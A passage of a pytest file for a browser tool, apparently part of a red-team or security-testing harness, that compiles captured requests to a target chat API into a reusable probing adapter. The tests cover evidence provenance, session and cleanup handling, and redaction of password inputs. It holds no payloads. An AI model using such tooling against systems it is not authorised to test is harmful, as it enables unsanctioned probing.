    class Recorder:
        async def list_observations(self, _context_id):
            return (durable_network,)

        async def record_handoff(self, _value):
            raise AssertionError("another session's durable prefix must not seal")

    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), Recorder())
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/closed",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )

    assert result.is_error is True
    assert result.content == "no exact captured JSON exchange matches the requested API endpoint"


@pytest.mark.asyncio
async def test_api_handoff_recovers_durable_exchange_after_restart_without_evidence_hints() -> None:
    interaction_actions, interaction_observations = _interaction_action_records(
        context_id="browser-context-restarted",
        target_id="target-restarted",
        tab_ref="tab:before-restart",
    )
    fill_action, submit_action = interaction_actions
    captured = [
        *_strict_creation_events("s-restarted"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-restarted", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
            "tab_ref": "tab:before-restart",
            "trigger_action_ref": submit_action.evidence_refs[0],
            "trigger_action_step": submit_action.step,
            "input_action_refs": {"/message": fill_action.evidence_refs[0]},
            "input_probe_refs": {"/message": fill_action.evidence_refs[1]},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/cleanup",
            "status": 200,
            "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
            "request_json": {"sessionId": "s-restarted"},
            "response_json": {"cleaned": True},
        },
    ]
    session_owner = owner()
    cleanup_action, cleanup_observations, cleanup_action_ref = _cleanup_action_records(
        context_id="browser-context-restarted",
        target_id="target-restarted",
    )
    setup_action, setup_observations = _setup_action_records(
        context_id="browser-context-restarted",
        target_id="target-restarted",
        tab_ref="tab:before-restart",
    )

    class Session:
        context_id = "browser-context-restarted"
        bounds = SimpleNamespace(target_id="target-restarted")
        owner = session_owner

        def api_exchange_events(self):
            return ()

    class Recorder:
        evidence = []

        async def list_actions(self, context_id):
            assert context_id == "browser-context-restarted"
            return (setup_action, *interaction_actions, cleanup_action)

        async def list_observations(self, context_id):
            assert context_id == "browser-context-restarted"
            return (
                BrowserObservation(
                    context_id=context_id,
                    target_id="target-restarted",
                    origin="https://target.test",
                    owner=session_owner,
                    tab_ref="tab:before-restart",
                    kind="network",
                    text=json.dumps(captured),
                    step=4,
                ),
                *setup_observations,
                *interaction_observations,
                *cleanup_observations,
            )

        async def record_evidence(self, context_id, evidence_ref, kind, payload):
            self.evidence.append((context_id, evidence_ref, kind, payload))

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()

    async def allow(*_):
        return True

    spec = next(
        item
        for item in _production_browser_tools(lambda _: Session(), recorder)
        if item.name == "browser_compile_api_handoff"
    ).describe()
    for obsolete in (
        "request_evidence_ref",
        "response_evidence_ref",
        "cleanup_request_evidence_ref",
        "cleanup_response_evidence_ref",
    ):
        assert obsolete not in spec.input_schema["properties"]
        assert obsolete not in spec.input_schema["required"]
    arguments = {
        "method": "POST",
        "url": "https://target.test/api/message",
        "input_pointer": "/message",
        "response_selector": "/reply",
        "success_witness": "reply is returned",
        "oracle_predicate": {
            "oracle_id": "oracle/target-process-internal",
            "pointer": "/reply",
            "match_values": ["objective reached"],
            "modality": "text",
            "turn": "single",
            "language": "und",
        },
        "authentication": "reviewed browser session",
        "session_constraint": "one active session identifier",
        "cleanup_method": "POST",
        "cleanup_url": "https://target.test/api/cleanup",
        "cleanup_action_evidence_ref": cleanup_action_ref,
        "cleanup_acknowledgement": {
            "pointer": "/cleaned",
            "match_values": [True],
            "status_codes": [200],
        },
        "session_creation_transition": _strict_creation_transition(),
    }
    broker = ToolBroker(_production_browser_tools(lambda _: Session(), recorder), confirmer=allow)
    obsolete_hint = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {**arguments, "request_evidence_ref": "sha256:incorrect-model-hint"},
    )
    assert obsolete_hint.is_error is True
    assert obsolete_hint.metadata["schema_validation_failed"] is True

    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        arguments,
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert [step["step_id"] for step in adapter["api_steps"]] == [
        "observed-session-setup",
        "observed-message-exchange",
        "observed-cleanup-exchange",
    ]
    assert len(recorder.evidence) == 11
    assert all(
        item[0] == "browser-context-restarted" and item[3]["target_id"] == "target-restarted"
        for item in recorder.evidence
    )


@pytest.mark.asyncio
async def test_api_handoff_never_resolves_durable_exchange_from_other_context_or_target() -> None:
    captured = json.dumps(
        [
            {
                "method": "POST",
                "url": "https://target.test/api/message",
                "status": 200,
                "request_json": {"message": "other context probe"},
                "response_json": {"reply": "other context response"},
            }
        ]
    )
    session_owner = owner()

    class Session:
        context_id = "browser-context-current"
        bounds = SimpleNamespace(target_id="target-current")
        owner = session_owner

        def api_exchange_events(self):
            return ()

    class Recorder:
        async def list_observations(self, _context_id):
            return (
                BrowserObservation(
                    context_id="browser-context-other",
                    target_id="target-current",
                    origin="https://target.test",
                    owner=session_owner,
                    tab_ref="tab:other-context",
                    kind="network",
                    text=captured,
                    step=1,
                ),
                BrowserObservation(
                    context_id="browser-context-current",
                    target_id="target-other",
                    origin="https://target.test",
                    owner=session_owner,
                    tab_ref="tab:other-target",
                    kind="network",
                    text=captured,
                    step=2,
                ),
            )

        async def record_handoff(self, value):
            raise AssertionError(f"cross-boundary handoff must not persist: {value}")

    async def allow(*_):
        return True

    result = await ToolBroker(
        browser_tools(lambda _: Session(), Recorder()), confirmer=allow
    ).invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
        },
    )

    assert result.is_error is True
    assert "no exact captured JSON exchange" in result.content


@pytest.mark.asyncio
async def test_api_handoff_seals_multi_turn_from_session_lifecycle_evidence() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/start",
                    "status": 200,
                    "request_json": {"scenario": "refund"},
                    "response_json": {"sessionId": "s-1"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"sessionId": "s-1", "message": "harmless probe"},
                    "response_json": {"reply": "observed response"},
                },
            )

    class Recorder:
        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()

    async def allow(*_):
        return True

    broker = ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    setup_step, message_step = adapter["api_steps"]
    assert setup_step["captures"] == {"session_id": "/sessionId"}
    assert message_step["interaction"] is True
    assert message_step["request_template"]["sessionId"] == "{{capture:session_id}}"
    # A reusable logical session token is not proof of one physical target state.
    assert "state_capabilities" not in adapter
    # The declared single-turn prose is overridden by the captured evidence of a
    # session value binding repeated turns into one lifecycle.
    assert message_step["oracle_predicate"]["turn"] == "multi"
    assert adapter["session_cardinality"]["status"] == "unverified"
    assert adapter["session_cardinality"]["maximum_concurrency"] is None
    assert adapter["session_cardinality"]["source"] == "observed_session_lifecycle"
    assert len(adapter["session_cardinality"]["evidence_refs"]) == 4
    assert adapter["interaction_limit"]["maximum_interactions"] is None


@pytest.mark.asyncio
async def test_api_handoff_seals_single_turn_without_session_lifecycle_evidence() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "observed response"},
                },
            )

    class Recorder:
        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()

    async def allow(*_):
        return True

    broker = ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "multi",
                "language": "und",
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    (message_step,) = adapter["api_steps"]
    assert message_step["interaction"] is True
    # Declared multi-turn prose without any captured session binding seals
    # honestly as single-turn.
    assert message_step["oracle_predicate"]["turn"] == "single"
    assert adapter["session_cardinality"] == {
        "status": "unverified",
        "maximum_concurrency": None,
        "source": "not_established",
        "evidence_refs": [],
        "reason": "no stateful session identity or isolation probe was observed",
    }
    assert adapter["interaction_limit"]["status"] == "unverified"
    assert adapter["interaction_limit"]["maximum_interactions"] is None
    assert adapter["interaction_limit"]["source"] == "not_established"


@pytest.mark.asyncio
async def test_api_handoff_does_not_infer_session_from_unrelated_repeated_strings() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "GET",
                    "url": "https://target.test/api/catalog",
                    "status": 200,
                    "request_json": None,
                    "response_json": {"scenario": "refund", "label": "level-1"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {
                        "scenario": "refund",
                        "level": "level-1",
                        "message": "harmless probe",
                    },
                    "response_json": {"reply": "observed response"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": 200,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "trigger_action_ref": _cleanup_action_records()[2],
                    "request_json": {},
                    "response_json": {"cleaned": True},
                },
            )

    class Recorder(_CleanupActionRecorder):
        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()

    async def allow(*_):
        return True

    result = await ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow).invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active browser session",
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/cleaned",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert len(adapter["api_steps"]) == 2
    assert adapter["api_steps"][0]["request_template"] == {
        "scenario": "refund",
        "level": "level-1",
        "message": "{{input}}",
    }


@pytest.mark.asyncio
async def test_api_handoff_allows_cleanup_to_remain_not_established() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "observed response"},
                },
            )

    class Recorder:
        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()

    async def allow(*_):
        return True

    result = await ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow).invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["cleanup_lifecycle"] == {
        "status": "not_established",
        "evidence_refs": [],
    }
    assert "cleanup_discovery" not in adapter
    assert [step["step_id"] for step in adapter["api_steps"]] == ["observed-message-exchange"]


@pytest.mark.asyncio
async def test_api_handoff_rejects_recon_baseline_as_success_oracle() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "continue", "state": "playing"},
                },
            )

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    async def allow(*_):
        return True

    recorder = Recorder()
    broker = ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "terminal objective state",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/state",
                "match_values": ["playing"],
                "modality": "text",
                "turn": "multi",
                "language": "und",
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    message_step = adapter["api_steps"][0]
    assert "oracle_predicate" not in message_step
    assert "ordinary reconnaissance response" in adapter["evaluation_uncertainties"][0]["reason"]


@pytest.mark.asyncio
async def test_api_handoff_normalizes_simple_model_emitted_jsonpaths() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"session": {"message": "harmless probe"}},
                    "response_json": {"result": {"reply": "observed response"}},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": 200,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "trigger_action_ref": _cleanup_action_records()[2],
                    "request_json": {},
                    "response_json": {"cleaned": True},
                },
            )

    class Recorder(_CleanupActionRecorder):
        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()

    async def allow(*_):
        return True

    broker = ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "$.session.message",
            "response_selector": "$.result.reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/result/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/cleaned",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["api_steps"][0]["request_template"] == {"session": {"message": "{{input}}"}}
    assert adapter["api_steps"][0]["response_selector"] == "/result/reply"


@pytest.mark.asyncio
async def test_api_handoff_rejects_numeric_setup_field_as_target_input() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/start",
                    "status": 200,
                    "request_json": {"aiAssisted": True, "levelId": 1},
                    "response_json": {"sessionId": "fresh-session"},
                },
            )

    class Recorder:
        async def record_handoff(self, value):
            self.handoff = value

    async def allow(*_):
        return True

    broker = ToolBroker(browser_tools(lambda _: Session(), Recorder()), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/start",
            "input_pointer": "/levelId",
            "response_selector": "/sessionId",
            "success_witness": "session starts",
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
        },
    )

    assert result.is_error is True
    assert "non-empty text" in result.content


@pytest.mark.asyncio
async def test_browser_fill_records_non_sensitive_input_verbatim() -> None:
    class Recorder:
        def __init__(self) -> None:
            self.actions = []
            self.observations = []
            self.observations = []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

        async def list_actions(self, _context_id):
            return tuple(self.actions)

        async def list_observations(self, _context_id):
            return tuple(self.observations)

    page = b"""
    <textarea aria-label="Message"></textarea>
    <button aria-label="Send" onclick="fetch('/api/message', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify({message:document.querySelector('textarea').value})
    })">Send</button>
    """
    async with web_fixture(page) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            send = next(item for item in snapshot.elements if item.name == "Send")
            recorder = Recorder()
            context = ToolContext(session_id="s1", workspace_root="/tmp")
            result = await BrowserTool("browser_fill", lambda _: session, recorder).invoke(
                context,
                {
                    "tab_ref": tab,
                    "element_ref": message.ref,
                    "value": "private harmless probe",
                    "connection_probe": True,
                    "step": 2,
                },
            )
            submitted = await BrowserTool("browser_click", lambda _: session, recorder).invoke(
                context,
                {"tab_ref": tab, "element_ref": send.ref, "step": 3},
            )
            for _ in range(20):
                if session.api_exchange_events():
                    break
                await asyncio.sleep(0.05)
            event = session.api_exchange_events()[-1]
            network = await BrowserTool(
                "browser_network_events", lambda _: session, recorder
            ).invoke(context, {"tab_ref": tab})

    assert result.is_error is False
    assert submitted.is_error is False
    assert network.is_error is False
    assert network.metadata["preferred_next_tool"] == "browser_compile_api_handoff"
    recorded = recorder.actions[0]
    # The fill target is an ordinary textarea, so the typed value persists verbatim
    # (including the harmless connection-probe marker) instead of being redacted.
    assert recorded.value is not None
    assert recorded.value.startswith("private harmless probe [Merlin connection probe ")
    assert recorded.redaction_status == "not_needed"
    assert "private harmless probe" in recorded.model_dump_json()
    assert len(recorded.evidence_refs) == 2
    action_ref = recorded.evidence_refs[0]
    assert action_ref.startswith("browser-action:sha256:")
    assert len(action_ref) == len("browser-action:sha256:") + 64
    assert action_ref in recorder.observations[0].evidence_refs
    assert event["input_action_refs"] == {"/message": action_ref}
    assert event["input_probe_refs"] == {"/message": recorded.evidence_refs[1]}
    assert event["trigger_action_ref"] == recorder.actions[1].evidence_refs[0]
    serialized_event = json.dumps(event, sort_keys=True)
    assert "private harmless probe" in serialized_event
    assert "browser-input-value" not in serialized_event


@pytest.mark.asyncio
async def test_browser_fill_redacts_credential_and_unknown_targets() -> None:
    class Recorder:
        def __init__(self) -> None:
            self.actions = []
            self.observations = []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    page = (
        b'<input type="password" aria-label="Account secret">'
        b'<button aria-label="Sign in">Sign in</button>'
    )
    async with web_fixture(page) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            secret = next(
                element for element in snapshot.elements if element.input_type == "password"
            )
            recorder = Recorder()
            context = ToolContext(session_id="s1", workspace_root="/tmp")
            tool = BrowserTool("browser_fill", lambda _: session, recorder)
            credential = await tool.invoke(
                context,
                {
                    "tab_ref": tab,
                    "element_ref": secret.ref,
                    "value": "hunter2-not-recorded",
                    "step": 2,
                },
            )
            unknown = await tool.invoke(
                context,
                {
                    "tab_ref": tab,
                    "element_ref": f"{tab}:unknown:0",
                    "value": "hunter2-unknown-target",
                    "step": 3,
                },
            )

    # core.act() refuses to type into a credential control and an unknown
    # element cannot be filled at all; both recordings must still be redacted.
    assert credential.is_error is True
    assert "credential and upload fields are unavailable" in credential.content
    assert unknown.is_error is True
    fills = [item for item in recorder.actions if item.kind == "fill"]
    assert len(fills) == 2
    assert all(item.value == "[redacted]" for item in fills)
    assert all(item.redaction_status == "redacted" for item in fills)
    serialized = json.dumps([item.model_dump(mode="json") for item in fills])
    assert "hunter2-not-recorded" not in serialized
    assert "hunter2-unknown-target" not in serialized


@pytest.mark.asyncio
@pytest.mark.parametrize("submit_kind", ("click", "press"))
async def test_api_handoff_accepts_exact_fill_submit_request_provenance(
    submit_kind: str,
) -> None:
    class Recorder:
        def __init__(self) -> None:
            self.actions = []
            self.observations = []
            self.handoff = None

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

        async def list_actions(self, _context_id):
            return tuple(self.actions)

        async def list_observations(self, _context_id):
            return tuple(self.observations)

        async def record_handoff(self, value):
            self.handoff = value

    page = b"""
    <form onsubmit="event.preventDefault(); fetch('/api/message', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify({message:document.querySelector('input').value})
    })">
      <input aria-label="Message">
      <button aria-label="Send" type="submit">Send</button>
    </form>
    """
    async with web_fixture(page) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            send = next(item for item in snapshot.elements if item.name == "Send")
            recorder = Recorder()
            context = ToolContext(session_id="s1", workspace_root="/tmp")
            await BrowserTool("browser_fill", lambda _: session, recorder).invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "tab_ref": tab,
                    "element_ref": message.ref,
                    "value": "harmless probe",
                    "connection_probe": True,
                    "step": 2,
                },
            )
            submit_arguments = {
                "tab_ref": tab,
                "element_ref": send.ref if submit_kind == "click" else message.ref,
                "step": 3,
            }
            if submit_kind == "press":
                submit_arguments["value"] = "Enter"
            await BrowserTool(f"browser_{submit_kind}", lambda _: session, recorder).invoke(
                context, submit_arguments
            )
            for _ in range(20):
                if session.api_exchange_events():
                    break
                await asyncio.sleep(0.05)
            result = await next(
                tool
                for tool in _production_browser_tools(lambda _: session, recorder)
                if tool.describe().name == "browser_compile_api_handoff"
            ).invoke(
                context,
                {
                    "method": "POST",
                    "url": f"{origin}/api/message",
                    "input_pointer": "/message",
                    "response_selector": "/reply",
                    "authentication": "reviewed browser session",
                    "session_constraint": "stateless request",
                },
            )

    assert result.is_error is False
    assert recorder.handoff is not None
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["api_steps"][0]["request_template"] == {"message": "{{input}}"}


@pytest.mark.asyncio
async def test_api_handoff_waits_for_newer_provenance_linked_response() -> None:
    recorded_at = datetime(2026, 9, 15, tzinfo=UTC)
    fill_ref = "browser-action:sha256:" + "1" * 64
    probe_ref = "browser-input-probe:reviewed-probe"
    submit_ref = "browser-action:sha256:" + "2" * 64
    fill = BrowserAction(
        context_id="browser-context",
        target_id="target",
        owner=owner(),
        kind="fill",
        tab_ref="tab:bank",
        element_ref="input",
        value="[redacted]",
        step=2,
        created_at=recorded_at + timedelta(seconds=1),
        evidence_refs=(fill_ref, probe_ref),
        redaction_status="redacted",
    )
    submit = BrowserAction(
        context_id="browser-context",
        target_id="target",
        owner=owner(),
        kind="click",
        tab_ref="tab:bank",
        element_ref="send",
        step=3,
        created_at=recorded_at + timedelta(seconds=2),
        evidence_refs=(submit_ref,),
    )
    action_observations = (
        BrowserObservation(
            context_id="browser-context",
            target_id="target",
            origin="https://target.test",
            owner=owner(),
            tab_ref="tab:bank",
            kind="snapshot",
            step=2,
            observed_at=recorded_at + timedelta(seconds=1),
            evidence_refs=(fill_ref,),
        ),
        BrowserObservation(
            context_id="browser-context",
            target_id="target",
            origin="https://target.test",
            owner=owner(),
            tab_ref="tab:bank",
            kind="snapshot",
            step=3,
            observed_at=recorded_at + timedelta(seconds=2),
            evidence_refs=(submit_ref,),
        ),
    )
    stale = {
        "method": "POST",
        "url": "https://target.test/api/message",
        "status": 200,
        "observed_at": recorded_at.isoformat(),
        "request_json": {"userMessage": "older unreviewed input"},
        "response_json": {"reply": "older response"},
    }
    reviewed = {
        "method": "POST",
        "url": "https://target.test/api/message",
        "status": 200,
        "observed_at": (recorded_at + timedelta(seconds=3)).isoformat(),
        "request_json": {"userMessage": "reviewed probe"},
        "response_json": {"reply": "new response"},
        "input_action_refs": {"/userMessage": fill_ref},
        "input_probe_refs": {"/userMessage": probe_ref},
        "trigger_action_ref": submit_ref,
    }

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def __init__(self) -> None:
            self.reads = 0

        def api_exchange_events(self):
            self.reads += 1
            return (stale,) if self.reads == 1 else (stale, reviewed)

    class Recorder:
        def __init__(self) -> None:
            self.handoff = None

        async def list_actions(self, _context_id):
            return fill, submit

        async def list_observations(self, _context_id):
            return action_observations

        async def record_handoff(self, value):
            self.handoff = value

    session = Session()
    recorder = Recorder()
    result = await next(
        tool
        for tool in _production_browser_tools(lambda _: session, recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/userMessage",
            "response_selector": "/reply",
            "authentication": "reviewed browser session",
            "session_constraint": "stateless request",
        },
    )

    assert result.is_error is False
    assert session.reads >= 2
    assert recorder.handoff is not None
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["api_steps"][0]["request_template"] == {"userMessage": "{{input}}"}


@pytest.mark.asyncio
async def test_api_handoff_rejects_string_setup_field_without_fill_provenance() -> None:
    setup_event = {
        "method": "POST",
        "url": "https://target.test/api/start",
        "status": 200,
        "request_json": {"aiAssisted": True, "levelId": "1"},
        "response_json": {"sessionId": "fresh-session"},
    }
    network = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:bank",
        kind="network",
        step=3,
        text=json.dumps([setup_event]),
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return ()

    class Recorder:
        async def list_actions(self, _context_id):
            return ()

        async def list_observations(self, _context_id):
            return (network,)

        async def record_handoff(self, _value):
            raise AssertionError("setup field must not seal as target input")

    result = await next(
        tool
        for tool in _production_browser_tools(lambda _: Session(), Recorder())
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/start",
            "input_pointer": "/levelId",
            "response_selector": "/sessionId",
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
        },
    )

    assert result.is_error is True
    assert "latest successful browser fill" in result.content


@pytest.mark.asyncio
async def test_api_handoff_rejects_setup_value_equal_to_unrelated_ordinary_fill() -> None:
    class Recorder:
        def __init__(self) -> None:
            self.actions = []
            self.observations = []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

        async def list_actions(self, _context_id):
            return tuple(self.actions)

        async def list_observations(self, _context_id):
            return tuple(self.observations)

        async def record_handoff(self, _value):
            raise AssertionError("ordinary equal-valued fill must not seal setup as chat")

    page = b"""
    <input aria-label="Unrelated control">
    <button aria-label="Start" onclick="fetch('/api/start', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify({levelId:document.querySelector('input').value})
    })">Start</button>
    """
    async with web_fixture(page) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            control = next(item for item in snapshot.elements if item.name == "Unrelated control")
            start = next(item for item in snapshot.elements if item.name == "Start")
            recorder = Recorder()
            context = ToolContext(session_id="s1", workspace_root="/tmp")
            await BrowserTool("browser_fill", lambda _: session, recorder).invoke(
                context,
                {"tab_ref": tab, "element_ref": control.ref, "value": "1", "step": 2},
            )
            await BrowserTool("browser_click", lambda _: session, recorder).invoke(
                context,
                {"tab_ref": tab, "element_ref": start.ref, "step": 3},
            )
            for _ in range(20):
                if session.api_exchange_events():
                    break
                await asyncio.sleep(0.05)
            event = session.api_exchange_events()[-1]
